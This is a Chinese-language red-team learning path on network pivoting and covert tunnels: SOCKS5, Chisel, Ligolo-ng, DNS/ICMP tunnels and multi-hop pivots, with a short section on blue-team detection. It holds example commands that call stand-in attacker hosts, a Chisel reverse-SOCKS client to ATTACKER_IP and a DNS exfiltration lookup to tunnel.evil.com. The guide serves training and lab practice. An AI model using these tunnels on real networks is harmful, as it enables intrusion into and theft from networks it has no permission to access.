# 🌪️ 網路流量穿透、SOCKS5 代理與隱蔽隧道深度學習路徑 (Network Pivoting & Covert Tunnels)
> 對應紅隊作戰矩陣：**Phase 5 (R20)** (R20.1 ~ R20.7)  
> 預計總投入時間：**30 ~ 35 小時**（視 TCP/IP 網路協定、SOCKS5 握手、虛擬 TUN 介面與封包路由基礎而定）

---

## 📍 你在哪裡、去哪裡

```text
你現在的狀態                         這份路徑帶你到達的位置
──────────────────                   ────────────────────────────
拿到外網主機後不知如何打內網 ──►     透徹理解多層代理鏈 (Proxychains) 與 L4/L7 轉發機制
只會用 SSH -D 本地轉發       ──►     精通 Chisel 反向 WebSocket 隧道與雙向流量轉發
卡在工具無法直接存取內網網段 ──►     掌握 Ligolo-ng 虛擬網卡 (TUN) 路由，將整個內網直接映射至本機
被防火牆嚴格封鎖全部 TCP 出口 ──►    精通 DNS 與 ICMP 隱蔽封裝隧道穿透與熵值逃逸
```

---

## 🧱 第零關：先確認你有這些基礎

| 核心先備概念 | 需要了解到的程度 | 快速補充資源 |
| :--- | :--- | :--- |
| SOCKS5 協定規範 | 理解 SOCKS5 握手流程、認證子協定、CONNECT 與 BIND 命令語意 | [IETF RFC 1928: SOCKS Protocol Version 5](https://datatracker.ietf.org/doc/html/rfc1928) |
| Linux 虛擬網路介面 (TUN/TAP) | 理解 Layer 3 (TUN 封包級) 與 Layer 2 (TAP 訊框級) 虛擬介面原理 | [Linux Kernel: TUN/TAP driver](https://docs.kernel.org/networking/tuntap.html) |
| 網路位址轉換 (NAT) 與反向代理 | 理解 SNAT, DNAT, 狀態化防火牆 (Stateful Inspection) 與外發連線放行規則 | [IETF RFC 3022: Traditional IP NAT](https://datatracker.ietf.org/doc/html/rfc3022) |
| DNS 查詢解析遞迴機制 | 理解 DNS 階層架構、權威 DNS 伺服器與 TXT/CNAME 紀錄承載資料上限 | [IETF RFC 1035: Domain Names](https://datatracker.ietf.org/doc/html/rfc1035) |

---

## 🗺️ 整體學習地圖（四個階段）

```text
階段一 (8h) ──────► 階段二 (10h) ─────► 階段三 (8h) ──────► 階段四 (6h)
SOCKS5代理原理      Ligolo-ng TUN虛擬   隱蔽外帶隧道        多層跳板穿透鏈
與Chisel反向隧道    路由與全子網穿透    (DNS/ICMP 封裝)     與流量檢測防禦對抗
```

---

## 🏛️ 階段一：SOCKS5 代理機制與 Chisel 反向穿透架構（約 8 小時）

### 1.1 SOCKS5 協定握手流程（RFC 1928）
SOCKS5 運作於 OSI 第 5 層（工作階段層）：
```text
[攻擊端 Client] ──── 1. 版本與認證協商 (0x05, 0x01, 0x00) ────► [SOCKS5 代理伺服器]
               ◄─── 2. 伺服器選擇無需認證 (0x05, 0x00) ─────────┤
               ──── 3. 請求連接目標 IP:Port (0x05, 0x01, ...) ──►
               ◄─── 4. 回應連接成功 (0x05, 0x00, 0x00, ...) ────┘
```
- **核心優勢**：透明代理任意 TCP/UDP 連線，攻擊端工具（如 Nmap `-sT`、Metasploit、瀏覽器）只需設定代理即可無縫穿透至目標網段。

### 1.2 Chisel 反向 WebSocket 隧道技術
當目標主機位於企業 NAT / 防火牆後方，無法由外部直接連入時：
- **架構**：外網攻擊機啟動 Chisel Server 監聽 80/443（偽裝 HTTP/HTTPS 流量）。
- **反向連線**：內網受控主機主動發起對外 TCP 連線建立 WebSocket 雙向通道，並在遠端反向開啟 SOCKS5 代理監聽埠：
  ```bash
  # 攻擊端 (監聽反向連線)
  chisel server -p 8080 --reverse
  # 目標端 (主動外連並在攻擊端開放 1080 SOCKS5 代理)
  ./chisel client <ATTACKER_IP>:8080 R:1080:socks
  ```

---

## 🥩 階段二：Ligolo-ng 革命性 TUN 介面與整網段路由穿透（約 10 小時）

### 2.1 傳統 SOCKS5 代理的痛苦極限
傳統 SOCKS5（搭配 Proxychains）只能代理支援 SOCKS 的特定應用層 TCP 工具；無法直接進行 SYN 掃描、無法傳輸 ICMP、無法直接使用常規 `ping` 或複雜協定。

### 2.2 Ligolo-ng 核心運作架構
```text
[攻擊機本機作業系統] ──(新增虛擬網卡 ligolo)──► [Ligolo-ng Proxy (外網)]
        │                                                │
   (新增路由表)                                   (TLS 加密隧道)
        │                                                │
  route add 172.16.10.0/24                               ▼
        ▼                                      [目標內網 Agent 跳板機]
   所有工具直打 172.16.10.x                               │
   (無需 proxychains！)  ────────────────────────► [目標內網全網段主機]
```
- **運作本質**：在攻擊端本機建立虛擬 TUN 介面，並將目標內網網段直接寫入作業系統路由表。攻擊機上的所有命令與工具（Nmap, smbclient, RDP）就像直接插上內網實體網線一樣直連！

---

## 🔬 階段三：隱蔽通訊外帶——DNS 與 ICMP 穿透對抗（約 8 小時）

### 3.1 DNS 隧道穿透原理（以 dnscat2 / iodine 為例）
當防火牆強制封鎖所有對外出站 TCP/UDP 流量，僅放行內部網域 DNS 遞迴查詢時：
- 攻擊者註冊專用網域（如 `tunnel.evil.com`）並將 NS 記錄指向受控的 C2 伺服器。
- 內網主機將待傳輸資料編碼為 Base32/Base64 並作為子域名向本地企業 DNS 發起查詢：
  `lookup <base32_payload>.tunnel.evil.com`
- 企業內部 DNS 逐級遞迴查詢，最終將 Payload 遞交至攻擊者掌控的權威伺服器；C2 則在 DNS TXT 記錄中夾帶回傳指令。

### 3.2 ICMP 隱蔽通道原理
利用 ICMP Echo Request / Reply 的可選 Data Payload 欄位（通常預設為填充英文字母），將任意指令封裝於 Ping 封包中傳輸，繞過未深度檢查 Payload 內容之無狀態防火牆。

---

## 🛡️ 階段四：多層跳板穿透鏈與藍隊遙測監控（約 6 小時）

### 4.1 雙重/多重 Pivot（內網多層架構穿透）
當深入企業隔離 DMZ / 核心工控區時，單一跳板無法抵達核心：
- 利用已掌握之跳板 A 建立中繼 PortProxy（如 `socat` 或 `netsh interface portproxy`）。
- 串接跳板 B 形成雙層或三層代理通道。

### 4.2 藍隊防禦偵測指標
- **流量基線與長連線異常**：監控持續數小時且帶有週期性 Heartbeat 的對外 TCP/TLS 連線。
- **DNS 查詢熵值 (Shannon Entropy) 告警**：監控解析請求中平均長度異常、字元亂度過高的未見子網域。
- **邊界防火牆嚴格策略**：嚴禁工作站直接出站直連外網非標準通訊埠；強制所有 DNS 查詢透過內部指定代理，並在邊界阻斷未經授權的外部 DNS 遞迴。

---

## 📋 自我評估檢查點
- [ ] 能向他人清楚繪製 SOCKS5 三次握手與代理連線建立時序圖。
- [ ] 能清楚說明 Proxychains 在動態鏈結庫層次（`LD_PRELOAD`）攔截 socket 呼叫的原理與其無法代理 ICMP 的限制。
- [ ] 能獨立配置 Ligolo-ng 建立本機 TUN 介面並向特定子網發起直連路由。
- [ ] 能解釋 DNS 隧道如何透過權威伺服器將資料外帶至外部受控主機。
- [ ] 能說明防火牆設定如何防範未授權的反向 WebSocket 隧道。

---

## 🏆 推薦實戰靶場與題庫直達
1. **Hack The Box: Wreaking Havoc / Dante Pro Lab**：專門訓練多層內網穿透與代理鏈跳板實戰環境。
2. **TryHackMe: Wreath Network**：經典公開多層跳板滲透實戰房間，涵蓋 Chisel, SOCKS5 與橫向跳板。[TryHackMe Wreath](https://tryhackme.com/room/wreath)
3. **Orange-Cyberdefense/GOAD**：練習在跨網段網域環境中佈建代理通道並推進攻擊路徑。[GOAD 專案](https://github.com/Orange-Cyberdefense/GOAD)
